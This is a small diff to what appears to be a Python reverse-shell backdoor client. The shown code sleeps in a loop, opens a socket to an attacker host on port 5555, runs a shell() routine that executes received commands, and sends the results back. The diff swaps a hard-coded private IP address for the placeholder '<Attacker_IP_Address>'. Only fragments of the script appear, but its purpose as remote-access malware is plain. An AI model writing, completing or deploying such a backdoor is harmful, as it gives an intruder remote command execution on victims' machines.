@@ -21,7 +21,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(('10.168.130.37', 5555))
+            s.connect(('<Attacker_IP_Address>', 5555))
             shell() # Execuring commands
             s.close()
             break
@@ -68,4 +68,5 @@ def shell():
             reliableSend(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 connection()
